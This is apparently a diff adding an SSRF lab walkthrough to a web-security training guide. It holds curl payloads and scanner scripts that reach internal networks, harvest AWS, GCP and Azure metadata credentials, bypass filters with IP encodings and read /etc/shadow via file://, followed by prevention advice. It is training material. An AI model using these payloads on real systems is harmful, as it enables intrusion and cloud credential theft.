@@ -15,6 +15,7 @@
 7. [WebSocket Manipulation](#7-websocket-manipulation)
 8. [Race Condition](#8-race-condition)
 9. [HTTP Host Header Injection](#9-http-host-header-injection)
+10. [SSRF via URL Fetcher](#10-ssrf-via-url-fetcher)
 
 ---
 
@@ -1334,9 +1335,335 @@ if __name__ == "__main__":
 
 ---
 
+## 10. SSRF via URL Fetcher
+
+### Vulnerability Description
+Server-Side Request Forgery (SSRF) allows attackers to make the server perform unauthorized HTTP requests to internal or external resources. URL fetchers that don't properly validate input can be exploited to access internal services, cloud metadata endpoints (AWS, GCP, Azure), read local files, and bypass network restrictions.
+
+### Lab URL
+`http://localhost:5000/api/vuln/ssrf`
+
+### Impact
+- Access to internal services (databases, admin panels, APIs)
+- Cloud metadata exfiltration (AWS/GCP/Azure credentials)
+- Local file system access
+- Network scanning and port enumeration
+- Bypass firewalls and access controls
+- Complete infrastructure compromise
+
+### Solution Steps
+
+#### Step 1: Basic SSRF - Localhost Access
+**Objective:** Access internal services via localhost
+
+**Using curl:**
+```bash
+# Try to access localhost
+curl "http://localhost:5000/api/vuln/ssrf?url=http://localhost:5000/api/vuln/api-unauth?action=secret"
+```
+
+**Using Burp Suite:**
+1. Intercept request to `/api/vuln/ssrf`
+2. Add parameter: `url=http://localhost:5000/api/vuln/api-unauth?action=secret`
+3. Send and observe the response
+4. Server makes the request on behalf of the client
+
+**Flag:** `FLAG{ssrf_localhost_access}`
+
+**Response includes:**
+- Access to internal API not exposed to internet
+- List of internal services (Redis, Elasticsearch, MongoDB)
+- Secret data from internal API (admin tokens, DB credentials)
+
+**Explanation:** SSRF allows accessing localhost services that are blocked from external access!
+
+#### Step 2: Internal Network Enumeration
+**Objective:** Scan internal network ranges
+
+**Using curl:**
+```bash
+# Access internal IP addresses
+curl "http://localhost:5000/api/vuln/ssrf?url=http://192.168.1.1"
+curl "http://localhost:5000/api/vuln/ssrf?url=http://10.0.0.1"
+curl "http://localhost:5000/api/vuln/ssrf?url=http://172.16.0.1"
+```
+
+**Flag:** `FLAG{ssrf_internal_network_access}`
+
+**Automation script for network scanning:**
+```bash
+# Scan internal network range
+for i in {1..254}; do
+  curl "http://localhost:5000/api/vuln/ssrf?url=http://192.168.1.$i" &
+done
+wait
+```
+
+**Explanation:** Use SSRF to enumerate and map internal network infrastructure.
+
+#### Step 3: Cloud Metadata Exploitation - AWS ⭐
+**Bypass Technique:** Access AWS EC2 metadata service to extract IAM credentials
+
+**Using curl:**
+```bash
+# AWS metadata endpoint
+curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/"
+
+# Extract IAM credentials
+curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials"
+
+# Full credential extraction
+curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
+```
+
+**Using Burp Suite:**
+1. In Repeater, set URL parameter to AWS metadata endpoint
+2. Try different metadata paths:
+   - `/latest/meta-data/` - List available metadata
+   - `/latest/user-data/` - User startup scripts
+   - `/latest/meta-data/hostname` - Instance hostname
+   - `/latest/meta-data/public-ipv4` - Public IP
+
+**Flag:** `FLAG{ssrf_aws_metadata_exfiltration}`
+
+**Exfiltrated AWS Credentials:**
+```json
+{
+  "AccessKeyId": "ASIA4XXXXXXXXXXXXXXX",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "IQoJb3JpZ2luX2VjEBwaCXVzLWVhc3QtMSJIMEYCIQDe...",
+  "Expiration": "2024-12-31T23:59:59Z"
+}
+```
+
+**Explanation:** SSRF to AWS metadata service can expose full IAM credentials with admin access!
+
+#### Step 4: Cloud Metadata Exploitation - GCP ⭐
+**Bypass Technique:** Access Google Cloud metadata to extract service account tokens
+
+**Using curl:**
+```bash
+# GCP metadata endpoint (requires specific header in real attacks)
+curl "http://localhost:5000/api/vuln/ssrf?url=http://metadata.google.internal/computeMetadata/v1/"
+
+# Service account token
+curl "http://localhost:5000/api/vuln/ssrf?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+```
+
+**Flag:** `FLAG{ssrf_gcp_metadata_access}`
+
+**Exfiltrated GCP Data:**
+```json
+{
+  "project": {
+    "projectId": "my-gcp-project-12345",
+    "numericProjectId": "123456789"
+  },
+  "instance": {
+    "id": "1234567890123456789",
+    "machineType": "n1-standard-2"
+  },
+  "serviceAccount": {
+    "email": "service-account@my-project.iam.gserviceaccount.com",
+    "token": "ya29.c.Kl6fB-..."
+  }
+}
+```
+
+**Explanation:** GCP service account tokens enable full API access to Google Cloud resources!
+
+#### Step 5: Cloud Metadata Exploitation - Azure ⭐
+**Bypass Technique:** Access Azure instance metadata service
+
+**Using curl:**
+```bash
+# Azure metadata endpoint
+curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# Managed identity token
+curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+**Flag:** `FLAG{ssrf_azure_metadata_exposed}`
+
+**Explanation:** Azure metadata provides managed identity tokens for accessing Azure resources.
+
+#### Step 6: IP Encoding Bypass ⭐
+**Bypass Technique:** Use alternate IP encodings to bypass URL filters
+
+**Using curl:**
+```bash
+# Decimal encoding: 127.0.0.1 = 2130706433
+curl "http://localhost:5000/api/vuln/ssrf?url=http://2130706433/"
+
+# Octal encoding: 127.0.0.1 = 0177.0.0.1
+curl "http://localhost:5000/api/vuln/ssrf?url=http://0177.0.0.1/"
+
+# Hexadecimal: 127.0.0.1 = 0x7f.0.0.1
+curl "http://localhost:5000/api/vuln/ssrf?url=http://0x7f.0.0.1/"
+
+# Mixed encoding
+curl "http://localhost:5000/api/vuln/ssrf?url=http://0x7f.0.0.0x1/"
+```
+
+**Flag:** `FLAG{ssrf_ip_encoding_bypass}`
+
+**Explanation:** Filters that block "127.0.0.1" or "localhost" can be bypassed with alternate IP representations.
+
+#### Step 7: File Protocol Access ⭐
+**Bypass Technique:** Use file:// protocol to read local files
+
+**Using curl:**
+```bash
+# Read /etc/passwd
+curl "http://localhost:5000/api/vuln/ssrf?url=file:///etc/passwd"
+
+# Read application config
+curl "http://localhost:5000/api/vuln/ssrf?url=file:///app/config/database.yml"
+
+# Read sensitive files
+curl "http://localhost:5000/api/vuln/ssrf?url=file:///etc/shadow"
+curl "http://localhost:5000/api/vuln/ssrf?url=file:///var/www/html/config.php"
+```
+
+**Flag:** `FLAG{ssrf_file_protocol_access}`
+
+**Exposed files:**
+```
+/etc/passwd - System users
+/etc/shadow - Password hashes
+/app/config/database.yml - DB credentials
+/var/www/html/config.php - Application config
+```
+
+**Explanation:** File protocol access allows reading arbitrary local files including sensitive configurations!
+
+### Automation Scripts
+
+**Python SSRF Scanner:**
+```python
+import requests
+
+base_url = "http://localhost:5000/api/vuln/ssrf"
+
+# Test targets
+targets = [
+    ("Localhost", "http://localhost:5000/api/vuln/api-unauth?action=secret"),
+    ("Internal Network", "http://192.168.1.1"),
+    ("AWS Metadata", "http://169.254.169.254/latest/meta-data/iam/security-credentials"),
+    ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/"),
+    ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+    ("IP Decimal", "http://2130706433/"),
+    ("File Protocol", "file:///etc/passwd"),
+]
+
+print("=== SSRF Exploitation Scanner ===\n")
+for name, target in targets:
+    print(f"Testing: {name}")
+    response = requests.get(f"{base_url}?url={target}")
+    data = response.json()
+    
+    if data.get('success'):
+        print(f"✓ Success! Flag: {data.get('flag', 'N/A')}")
+        if 'vulnerability' in data:
+            print(f"  Vulnerability: {data['vulnerability']}")
+    else:
+        print(f"✗ Failed")
+    print()
+```
+
+**Bash Network Scanner:**
+```bash
+#!/bin/bash
+BASE_URL="http://localhost:5000/api/vuln/ssrf"
+
+echo "=== Internal Network Scanner ==="
+for ip in 192.168.1.{1..10}; do
+    echo "Scanning: $ip"
+    curl -s "${BASE_URL}?url=http://${ip}" | grep -i "flag\|success"
+done
+
+echo -e "\n=== Cloud Metadata Scanner ==="
+METADATA_ENDPOINTS=(
+    "http://169.254.169.254/latest/meta-data/"
+    "http://metadata.google.internal/computeMetadata/v1/"
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+)
+
+for endpoint in "${METADATA_ENDPOINTS[@]}"; do
+    echo "Testing: $endpoint"
+    curl -s "${BASE_URL}?url=${endpoint}" | grep -i "flag\|AccessKeyId\|token"
+done
+```
+
+### Advanced SSRF Techniques
+
+**DNS Rebinding Attack:**
+1. Register domain that alternates between:
+   - External IP (first resolution)
+   - Internal IP (second resolution)
+2. Server checks external IP (allowed)
+3. Actual request goes to internal IP
+
+**Protocol Smuggling:**
+```bash
+# Try different protocols
+curl "http://localhost:5000/api/vuln/ssrf?url=ftp://internal-ftp/"
+curl "http://localhost:5000/api/vuln/ssrf?url=dict://localhost:11211/stats"
+curl "http://localhost:5000/api/vuln/ssrf?url=gopher://localhost:6379/_INFO"
+```
+
+**URL Parser Confusion:**
+```bash
+# Use @ symbol to confuse parsers
+curl "http://localhost:5000/api/vuln/ssrf?url=http://trusted.com@localhost/"
+
+# Use URL encoding
+curl "http://localhost:5000/api/vuln/ssrf?url=http://localhost%2f%252e%252e%252f"
+```
+
+### Prevention Measures
+1. **Whitelist Approach** - Only allow specific domains/IPs
+2. **Block Private IP Ranges** - Reject 127.0.0.1, 10.0.0.0/8, 192.168.0.0/16, 169.254.0.0/16
+3. **Disable Unused Protocols** - Block file://, gopher://, dict://, etc.
+4. **Use Cloud IMDSv2** - Require session tokens for metadata access
+5. **Network Segmentation** - Isolate application from internal services
+6. **Validate Response Content** - Don't blindly return fetched content
+7. **Implement Timeouts** - Prevent hanging on internal requests
+
+**Example secure implementation:**
+```javascript
+const allowedDomains = ['api.example.com', 'cdn.example.com'];
+const blockedRanges = ['127.0.0.0/8', '10.0.0.0/8', '192.168.0.0/16', '169.254.0.0/16'];
+
+function isSafeURL(url) {
+  const parsed = new URL(url);
+  
+  // Only allow HTTP/HTTPS
+  if (!['http:', 'https:'].includes(parsed.protocol)) {
+    return false;
+  }
+  
+  // Check whitelist
+  if (!allowedDomains.includes(parsed.hostname)) {
+    return false;
+  }
+  
+  // Resolve and check IP not in private ranges
+  const ip = dns.resolve(parsed.hostname);
+  if (isPrivateIP(ip, blockedRanges)) {
+    return false;
+  }
+  
+  return true;
+}
+```
+
+---
+
 ## Conclusion
 
-These 9 intermediate labs cover advanced web application vulnerabilities with real-world bypass techniques. Each lab includes:
+These 10 intermediate labs cover advanced web application vulnerabilities with real-world bypass techniques. Each lab includes:
 - **Basic exploitation** to understand the vulnerability
 - **Bypass techniques** (⭐) to overcome security controls
 - **Multiple attack vectors** using curl and Burp Suite
@@ -1352,6 +1679,7 @@ These 9 intermediate labs cover advanced web application vulnerabilities with re
 7. **WebSocket**: Origin validation bypass, cross-site hijacking
 8. **Race Condition**: TOCTOU exploitation, parallel request flooding
 9. **Host Header**: X-Forwarded-Host bypass, cache poisoning
+10. **SSRF**: Cloud metadata exfiltration (AWS/GCP/Azure), IP encoding bypass, file protocol access
 
 ### Next Steps:
 1. Practice each lab systematically
